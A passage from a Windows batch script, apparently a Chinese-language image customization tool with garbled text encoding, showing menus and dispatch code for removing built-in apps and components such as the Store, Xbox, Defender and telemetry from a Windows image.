	if !errorlevel!==15 set "Component=3DViewer"
	if !errorlevel!==14 set "Component=MixedRealityPortal"
	if !errorlevel!==13 set "Component=WalletService"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=FeedbackHub"
	if !errorlevel!==6  set "Component=DesktopAppInstaller"
	if !errorlevel!==5  set "Component=Cortana"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

:RemoveWindowsAppsMenu2
cls&mode con cols=80 lines=48&title ����WindowsӦ�ö�
set "goto=:RemoveWindowsAppsMenu2"
if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x86" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows Ӧ�ö� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҵ� Office Ӧ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��ͼ 3D Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ����Ӧ�� ^| �����ڣ�������                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ��ƬӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Print 3D Ӧ��                                                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] ��ͼ�Ͳ�ͼӦ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Skype Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Solitaire Collection Ӧ�� ^| �����ڣ�Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
if "!ImageBuild!" equ "17763" (
	echo.   ^|   [J] ���Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
)
if "!ImageBuild!" neq "17763" (
	echo.   ^|   [J] ���Ӧ�� ^| �����ڣ�Windows Ӧ���̵�                              ^|
	echo.   ^|                                                                        ^|
)
	echo.   ^|   [K] ʹ�ü���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ¼����Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] ����Ӧ�� ^| �����ڣ�Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [N] Web ý�����������                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] WebP ͼ�����������                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] Windows �ʼ�Ӧ�� ^| �����ڣ�Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] ����ֻ�Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [R] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQRX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==19 goto :RemoveWindowsAppsMenu
	if !errorlevel!==18 set "Component=WindowsApps2"
	if !errorlevel!==17 set "Component=YourPhone"
	if !errorlevel!==16 set "Component=CommunicationsApps"
	if !errorlevel!==15 set "Component=WebpImageExtensions"
	if !errorlevel!==14 set "Component=WebMediaExtensions"
	if !errorlevel!==13 set "Component=BingWeather"
	if !errorlevel!==12 set "Component=SoundRecorder"
	if !errorlevel!==11 set "Component=Getstarted"
	if !errorlevel!==10 set "Component=StickyNotes"
	if !errorlevel!==9 set "Component=SolitaireCollection"
	if !errorlevel!==8 set "Component=SkypeApp"
	if !errorlevel!==7 set "Component=ScreenSketch"
	if !errorlevel!==6 set "Component=Print3D"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x64" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows Ӧ�ö� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҵ� Office Ӧ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��ͼ 3D Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ����Ӧ�� ^| �����ڣ�������                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ��ƬӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Print 3D Ӧ��                                                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] ��ͼ�Ͳ�ͼӦ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Skype Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Solitaire Collection Ӧ�� ^| �����ڣ�Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
if "!ImageBuild!" equ "17763" (
	echo.   ^|   [J] ���Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
)
if "!ImageBuild!" neq "17763" (
	echo.   ^|   [J] ���Ӧ�� ^| �����ڣ�Windows Ӧ���̵�                              ^|
	echo.   ^|                                                                        ^|
)
	echo.   ^|   [K] ʹ�ü���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ¼����Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] ����Ӧ�� ^| �����ڣ�Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [N] Web ý�����������                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] WebP ͼ�����������                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] Windows �ʼ�Ӧ�� ^| �����ڣ�Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] ����ֻ�Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [R] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQRX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==19 goto :RemoveWindowsAppsMenu
	if !errorlevel!==18 set "Component=WindowsApps2"
	if !errorlevel!==17 set "Component=YourPhone"
	if !errorlevel!==16 set "Component=CommunicationsApps"
	if !errorlevel!==15 set "Component=WebpImageExtensions"
	if !errorlevel!==14 set "Component=WebMediaExtensions"
	if !errorlevel!==13 set "Component=BingWeather"
	if !errorlevel!==12 set "Component=SoundRecorder"
	if !errorlevel!==11 set "Component=Getstarted"
	if !errorlevel!==10 set "Component=StickyNotes"
	if !errorlevel!==9 set "Component=SolitaireCollection"
	if !errorlevel!==8 set "Component=SkypeApp"
	if !errorlevel!==7 set "Component=ScreenSketch"
	if !errorlevel!==6 set "Component=Print3D"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x86" (
	echo.        
	echo.    ____________________________ Windows Ӧ�ö� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҵ� Office Ӧ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��ͼ 3D Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ����Ӧ�� ^| �����ڣ�������                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ��ƬӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ��ͼ�Ͳ�ͼӦ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Skype Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Solitaire Collection Ӧ�� ^| �����ڣ�Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] ���Ӧ�� ^| �����ڣ�Windows Ӧ���̵�                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] ʹ�ü���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ¼����Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ����Ӧ�� ^| �����ڣ�Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] Web ý�����������                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] WebP ͼ�����������                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] Windows �ʼ�Ӧ�� ^| �����ڣ�Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] ����ֻ�Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps2"
	if !errorlevel!==16 set "Component=YourPhone"
	if !errorlevel!==15 set "Component=CommunicationsApps"
	if !errorlevel!==14 set "Component=WebpImageExtensions"
	if !errorlevel!==13 set "Component=WebMediaExtensions"
	if !errorlevel!==12 set "Component=BingWeather"
	if !errorlevel!==11 set "Component=SoundRecorder"
	if !errorlevel!==10 set "Component=Getstarted"	
	if !errorlevel!==9 set "Component=StickyNotes"
	if !errorlevel!==8 set "Component=SolitaireCollection"
	if !errorlevel!==7 set "Component=SkypeApp"
	if !errorlevel!==6 set "Component=ScreenSketch"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x64" (
	echo.        
	echo.    ____________________________ Windows Ӧ�ö� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҵ� Office Ӧ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] OneNote Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��ͼ 3D Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ����Ӧ�� ^| �����ڣ�������                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ��ƬӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ��ͼ�Ͳ�ͼӦ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Skype Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Solitaire Collection Ӧ�� ^| �����ڣ�Xbox Game Callable UI        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] ���Ӧ�� ^| �����ڣ�Windows Ӧ���̵�                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] ʹ�ü���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ¼����Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ����Ӧ�� ^| �����ڣ�Advertising Xaml                              ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] Web ý�����������                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] WebP ͼ�����������                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] Windows �ʼ�Ӧ�� ^| �����ڣ�Advertising Xaml                      ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] ����ֻ�Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps2"
	if !errorlevel!==16 set "Component=YourPhone"
	if !errorlevel!==15 set "Component=CommunicationsApps"
	if !errorlevel!==14 set "Component=WebpImageExtensions"
	if !errorlevel!==13 set "Component=WebMediaExtensions"
	if !errorlevel!==12 set "Component=BingWeather"
	if !errorlevel!==11 set "Component=SoundRecorder"
	if !errorlevel!==10 set "Component=Getstarted"
	if !errorlevel!==9 set "Component=StickyNotes"
	if !errorlevel!==8 set "Component=SolitaireCollection"
	if !errorlevel!==7 set "Component=SkypeApp"
	if !errorlevel!==6 set "Component=ScreenSketch"
	if !errorlevel!==5 set "Component=Photos"
	if !errorlevel!==4 set "Component=People"
	if !errorlevel!==3 set "Component=Paint3D"
	if !errorlevel!==2 set "Component=OfficeOneNote"
	if !errorlevel!==1 set "Component=OfficeHub"
	goto :RemoveWindowsComponents
)

:RemoveWindowsAppsMenu3
cls&mode con cols=80 lines=30&title ����WindowsӦ����
set "goto=:RemoveWindowsAppsMenu3"
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    ____________________________ Windows Ӧ���� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] Windows Ӧ���̵� ^| �����ڣ�Smart Screen                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Xbox Ӧ��                                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:12X /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==3 goto :RemoveWindowsAppsMenu
	if !errorlevel!==2 set "Component=XboxApp"
	if !errorlevel!==1 set "Component=WindowsStore"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows Ӧ���� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] Windows Ӧ���̵� ^| �����ڣ�Smart Screen                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Xbox Ӧ��                                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:12X /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==3 goto :RemoveWindowsAppsMenu
	if !errorlevel!==2 set "Component=XboxApp"
	if !errorlevel!==1 set "Component=WindowsStore"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows Ӧ���� ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] Windows Ӧ���̵� ^| �����ڣ�Smart Screen                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Xbox Ӧ��                                                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] Xbox Identity Provider                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:123X /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==4 goto :RemoveWindowsAppsMenu
	if !errorlevel!==3 set "Component=XboxIdentityProvider"
	if !errorlevel!==2 set "Component=XboxApp"
	if !errorlevel!==1 set "Component=WindowsStore"
	goto :RemoveWindowsComponents
)

:RemoveWindowsComponents
:: Internet ���
if "!Component!" equ "AdobeFlashForWindows" call :RemoveWindowsComponent "Mount" "������ Windows �� Adobe Flash" "AdobeFlashForWindows"
:: if "!Component!" equ "InternetExplorer" call :RemoveWindowsComponent "Mount", "Internet Explorer", "InternetExplorer"

:: ��ý�����
if "!Component!" equ "FirstLogonAnimation" call :RemoveWindowsComponent "Mount", "�״ε�¼����", "FirstLogonAnimation"
if "!Component!" equ "GameExplorer" call :RemoveWindowsComponent "Mount", "��Ϸ�����", "GameExplorer"
if "!Component!" equ "SnippingTool" call :RemoveWindowsComponent "Mount", "��ͼ����", "SnippingTool"
if "!Component!" equ "SpeechRecognition" call :RemoveWindowsComponent "Mount", "����ʶ��", "SpeechRecognition"
if "!Component!" equ "WindowsMediaPlayer" call :RemoveWindowsComponent "Mount", "Windows Media Player", "WindowsMediaPlayer"
if "!Component!" equ "WindowsPhotoViewer" call :RemoveWindowsComponent "Mount", "Windows ��Ƭ�鿴��", "WindowsPhotoViewer"
if "!Component!" equ "WinSAT" call :RemoveWindowsComponent "Mount", "Windows ϵͳ��������", "WinSAT"

:: ��˽���
if "!Component!" equ "AssignedAccess" call :RemoveWindowsComponent "Mount", "����ķ���Ȩ��", "AssignedAccess"
if "!Component!" equ "CEIP_SQM" call :RemoveWindowsComponent "Mount", "�ͻ�������Ƽƻ� [CEIP]", "CEIP_SQM"
if "!Component!" equ "FaceRecognition" call :RemoveWindowsComponent "Mount", "����ʶ��", "FaceRecognition"
if "!Component!" equ "KernelDebugging" call :RemoveWindowsComponent "Mount", "�ں˵���", "KernelDebugging"
if "!Component!" equ "LocationService" call :RemoveWindowsComponent "Mount", "��λ����", "LocationService"
if "!Component!" equ "PicturePassword" call :RemoveWindowsComponent "Mount", "ͼƬ����", "PicturePassword"
if "!Component!" equ "PinEnrollment" call :RemoveWindowsComponent "Mount", "Pin Enrollment", "PinEnrollment"
if "!Component!" equ "UnifiedTelemetryClient" call :RemoveWindowsComponent "Mount", "ͳһң��ͻ��� [Asimov]", "UnifiedTelemetryClient"
if "!Component!" equ "WiFiNetworkManager" call :RemoveWindowsComponent "Mount", "WiFi Network Manager", "WiFiNetworkManager"
if "!Component!" equ "WindowsErrorReporting" call :RemoveWindowsComponent "Mount", "Windows ���󱨸�", "WindowsErrorReporting"
if "!Component!" equ "WindowsInsiderHub" call :RemoveWindowsComponent "Mount", "Windows ��Ա����", "WindowsInsiderHub"

:: Զ�̴������
if "!Component!" equ "HomeGroup" call :RemoveWindowsComponent "Mount", "��ͥ��", "HomeGroup"
if "!Component!" equ "MultiPointConnector" call :RemoveWindowsComponent "Mount", "MultiPoint Connector", "MultiPointConnector"
if "!Component!" equ "RemoteAssistance" call :RemoveWindowsComponent "Mount", "Զ��Э��", "RemoteAssistance"

:: ϵͳ���
if "!Component!" equ "DeviceLockdown" call :RemoveWindowsComponent "Mount", "�豸���� [Ƕ��ʽ����]", "DeviceLockdown"
if "!Component!" equ "EaseOfAccessThemes" call :RemoveWindowsComponent "Mount", "���ɷ�������", "EaseOfAccessThemes"
if "!Component!" equ "EasyTransfer" call :RemoveWindowsComponent "Mount", "���ɴ���", "EasyTransfer"
if "!Component!" equ "FileHistory" call :RemoveWindowsComponent "Mount", "�ļ���ʷ��¼", "FileHistory"
if "!Component!" equ "ManualSetup" call :RemoveWindowsManualSetup
if "!Component!" equ "Paint" call :RemoveWindowsComponent "Mount", "Microsoft ��ͼ", "Paint"
if "!Component!" equ "SecurityCenter" call :RemoveWindowsComponent "Mount", "��ȫ����", "SecurityCenter"
if "!Component!" equ "StepsRecorder" call :RemoveWindowsComponent "Mount", "�����¼��", "StepsRecorder"
if "!Component!" equ "SystemRestore" call :RemoveWindowsComponent "Mount", "ϵͳ�ָ�", "SystemRestore"
if "!Component!" equ "WindowsBackup" call :RemoveWindowsComponent "Mount", "Windows ����", "WindowsBackup"
if "!Component!" equ "WindowsSubsystemForLinux" call :RemoveWindowsComponent "Mount", "������ Linux �� Windows ��ϵͳ", "WindowsSubsystemForLinux"
if "!Component!" equ "WindowsToGo" call :RemoveWindowsComponent "Mount", "Windows To Go", "WindowsToGo"
if "!Component!" equ "Wordpad" call :RemoveWindowsComponent "Mount", "д�ְ�", "Wordpad"

:: System Apps
if "!Component!" equ "AADBrokerPlugin" call :RemoveWindowsComponent "Mount", "Azure Active Directory AppX ������", "AADBrokerPlugin"
if "!Component!" equ "AssignedAccessLockApp" call :RemoveWindowsComponent "Mount", "ָ����������Ӧ��", "AssignedAccessLockApp"
if "!Component!" equ "BioEnrollment" call :RemoveWindowsComponent "Mount", "����ע��Ӧ��", "BioEnrollment"
if "!Component!" equ "CBSPreview" call :RemoveWindowsComponent "Mount", "Camera Barcode Scanner", "CBSPreview"
if "!Component!" equ "ContentDeliveryManager" call :RemoveWindowsComponent "Mount", "Content Delivery Manager", "ContentDeliveryManager"
if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!Component!" equ "Cortana" call :RemoveWindowsComponent "Mount", "Cortana����ʼ�˵�����������Ӧ��", "Cortana"
if "!Component!" equ "ECApp" call :RemoveWindowsComponent "Mount", "Ŀ�ӿ���Ӧ��", "ECApp"
if "!Component!" equ "Edge" (
	call :RemoveWindowsComponent "Mount", "Edge �����߹��߿ͻ���", "EdgeDevToolsClient"
	call :RemoveWindowsComponent "Mount", "Edge �����Ӧ��", "Edge"
	call :RemoveWindowsComponent "Mount", "Windows �Ķ��� [PDF]", "WindowsReaderPDF"
)
if "!Component!" equ "EdgeDevToolsClient" call :RemoveWindowsComponent "Mount", "Edge �����߹��߿ͻ���", "EdgeDevToolsClient"
if "!Component!" equ "FileExplorer" call :RemoveWindowsComponent "Mount", "�ļ���Դ������Ӧ��", "FileExplorer"
if "!Component!" equ "LockApp" call :RemoveWindowsComponent "Mount", "����Ӧ��", "LockApp"
if "!Component!" equ "MapControl" call :RemoveWindowsComponent "Mount", "��ͼ�ؼ�", "MapControl"
if "!Component!" equ "NarratorQuickStart" call :RemoveWindowsComponent "Mount", "Narrator QuickStart", "NarratorQuickStart"
if "!Component!" equ "OneDrive" call :RemoveWindowsComponent "Mount", "OneDrive ����ͻ���", "OneDrive"
if "!Component!" equ "ParentalControls" call :RemoveWindowsComponent "Mount", "�ҳ�����Ӧ��", "ParentalControls"
if "!Component!" equ "PeopleExperienceHost" call :RemoveWindowsComponent "Mount", "People Experience ����", "PeopleExperienceHost"
if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!Component!" equ "PPIProjection" call :RemoveWindowsComponent "Mount", "Connect Ӧ��", "PPIProjection"
if "!Component!" equ "QuickAssist" call :RemoveWindowsComponent "Mount", "��������Ӧ��", "QuickAssist"
if "!Component!" equ "RetailDemoContent" call :RemoveWindowsComponent "Mount", "������ʾ����", "RetailDemoContent"
if "!Component!" equ "SecureAssessmentBrowser" call :RemoveWindowsComponent "Mount", "Take Test Ӧ��", "SecureAssessmentBrowser"
if "!Component!" equ "SettingSync" call :RemoveWindowsComponent "Mount", "����ͬ��", "SettingSync"
if "!Component!" equ "SkypeORTC" call :RemoveWindowsComponent "Mount", "Skype ORTC", "SkypeORTC"
if "!Component!" equ "SmartScreen" call :RemoveWindowsComponent "Mount", "SmartScreen Ӧ��", "SmartScreen"
if "!Component!" equ "Win32WebViewHost" call :RemoveWindowsComponent "Mount", "Win32 WebView ����", "Win32WebViewHost"
if "!Component!" equ "WindowsDefender" call :RemoveWindowsComponent "Mount", "Windows Defender Ӧ��", "WindowsDefender"
if "!Component!" equ "WindowsMixedReality" call :RemoveWindowsComponent "Mount", "Windows �����ʵ", "WindowsMixedReality"
if "!Component!" equ "WindowsReaderPDF" call :RemoveWindowsComponent "Mount", "Windows �Ķ��� [PDF]", "WindowsReaderPDF"
if "!Component!" equ "XboxGameCallableUI" call :RemoveWindowsComponent "Mount", "Xbox Game Callable UI", "XboxGameCallableUI"

:: Windows Ӧ��
if "!Component!" equ "3DViewer" call :RemoveWindowsComponent "Mount", "�����ʵ�鿴��Ӧ��", "3DViewer"
if "!Component!" equ "AdvertisingXaml" call :RemoveWindowsComponent "Mount", "Advertising Xaml", "AdvertisingXaml"
if "!Component!" equ "Alarms" call :RemoveWindowsComponent "Mount", "���Ӻ�ʱ��Ӧ��", "Alarms"
if "!Component!" equ "BingWeather" call :RemoveWindowsComponent "Mount", "����Ӧ��", "BingWeather"
if "!Component!" equ "Calculator" call :RemoveWindowsComponent "Mount", "������Ӧ��", "Calculator"
if "!Component!" equ "Camera" call :RemoveWindowsComponent "Mount", "���Ӧ��", "Camera"
if "!ImageBuild!" equ "19041" if "!Component!" equ "Cortana" call :RemoveWindowsComponent "Mount", "Cortana Ӧ��", "Cortana"
if "!Component!" equ "CommunicationsApps" call :RemoveWindowsComponent "Mount", "Windows �ʼ�Ӧ��", "CommunicationsApps"
if "!Component!" equ "DesktopAppInstaller" call :RemoveWindowsComponent "Mount", "����Ӧ�ð�װ����", "DesktopAppInstaller"
if "!Component!" equ "FeedbackHub" call :RemoveWindowsComponent "Mount", "��������Ӧ��", "FeedbackHub"
if "!Component!" equ "GetHelp" call :RemoveWindowsComponent "Mount", "��ȡ����Ӧ��", "GetHelp"
if "!Component!" equ "Getstarted" call :RemoveWindowsComponent "Mount", "ʹ�ü���Ӧ��", "Getstarted"
if "!Component!" equ "HEIFImageExtension" call :RemoveWindowsComponent "Mount", "��Чͼ���ļ�����������", "HEIFImageExtension"
if "!Component!" equ "Maps" call :RemoveWindowsComponent "Mount", "��ͼӦ��", "Maps"
if "!Component!" equ "Messaging" call :RemoveWindowsComponent "Mount", "��ϢӦ��", "Messaging"
if "!Component!" equ "MixedRealityPortal" call :RemoveWindowsComponent "Mount", "�����ʵ�Ż�Ӧ��", "MixedRealityPortal"
if "!Component!" equ "OfficeHub" call :RemoveWindowsComponent "Mount", "�ҵ� Office Ӧ��", "OfficeHub"
if "!Component!" equ "OfficeOneNote" call :RemoveWindowsComponent "Mount", "OneNote Ӧ��", "OfficeOneNote"
if "!Component!" equ "OneConnect" call :RemoveWindowsComponent "Mount", "�ƶ��ײ�Ӧ��", "OneConnect"
if "!Component!" equ "Paint3D" call :RemoveWindowsComponent "Mount", "��ͼ 3D Ӧ��", "Paint3D"
if "!Component!" equ "People" call :RemoveWindowsComponent "Mount", "����Ӧ��", "People"
if "!Component!" equ "Photos" call :RemoveWindowsComponent "Mount", "��ƬӦ��", "Photos"
if "!Component!" equ "Print3D" call :RemoveWindowsComponent "Mount", "Print 3D Ӧ��", "Print3D"
if "!Component!" equ "ScreenSketch" call :RemoveWindowsComponent "Mount", "��ͼ�Ͳ�ͼӦ��", "ScreenSketch"
if "!Component!" equ "SkypeApp" call :RemoveWindowsComponent "Mount", "Skype Ӧ��", "SkypeApp"
if "!Component!" equ "SolitaireCollection" call :RemoveWindowsComponent "Mount", "Solitaire Collection Ӧ��", "SolitaireCollection"
if "!Component!" equ "SoundRecorder" call :RemoveWindowsComponent "Mount", "¼����Ӧ��", "SoundRecorder"
if "!Component!" equ "StickyNotes" call :RemoveWindowsComponent "Mount", "���Ӧ��", "StickyNotes"
if "!Component!" equ "VP9VideoExtensions" call :RemoveWindowsComponent "Mount", "Google �� VP9 WebM ��Ƶ����������", "VP9VideoExtensions"
if "!Component!" equ "WalletService" call :RemoveWindowsComponent "Mount", "Microsoft Pay Ӧ��", "WalletService"
if "!Component!" equ "WebMediaExtensions" call :RemoveWindowsComponent "Mount", "Web ý����չ���", "WebMediaExtensions"
if "!Component!" equ "WebpImageExtensions" call :RemoveWindowsComponent "Mount", "Webp ͼ����չ���", "WebpImageExtensions"
if "!Component!" equ "WindowsStore" call :RemoveWindowsComponent "Mount", "Windows Ӧ���̵�Ӧ��", "WindowsStore"
if "!Component!" equ "XboxApp" call :RemoveWindowsComponent "Mount", "Xbox Ӧ��", "XboxApp"
if "!Component!" equ "XboxIdentityProvider" call :RemoveWindowsComponent "Mount", "Xbox Identity Provider", "XboxIdentityProvider"
if "!Component!" equ "YourPhone" call :RemoveWindowsComponent "Mount", "����ֻ�Ӧ��", "YourPhone"
if "!Component!" equ "ZuneMusic" call :RemoveWindowsComponent "Mount", "Groove ����Ӧ��", "ZuneMusic"
if "!Component!" equ "ZuneVideo" if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "��Ӱ�͵���Ӧ��", "ZuneVideo"
